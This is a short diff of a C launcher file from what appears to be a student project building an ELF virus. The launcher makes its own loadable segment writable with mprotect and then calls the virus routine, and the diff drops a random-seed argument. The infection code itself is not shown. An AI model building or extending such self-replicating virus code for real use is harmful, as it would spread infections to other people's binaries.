@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/27 00:16:00 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/27 01:45:21 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -22,7 +22,6 @@
 **   - it is NOT copied into infected files (unlike the loader and virus)
 **   - it makes the current PT_LOAD writable so that the virus runs under the
 **     same conditions as with the loader
-**   - it initialises the virus' seed to [0l, ~0l]
 */
 
 void	_start(void)
@@ -53,9 +52,8 @@ void	_start(void)
 	if (sys_mprotect(pt_load_addr, pt_load_size, prot_rwx) < 0)
 		sys_exit(putstr("failed to make current PT_LOAD writable\n"));
 
-	uint64_t seed[2] = {0l, ~0l};
+	virus();
 
-	virus(seed);
 	sys_exit(0);
 	__builtin_unreachable();
 }
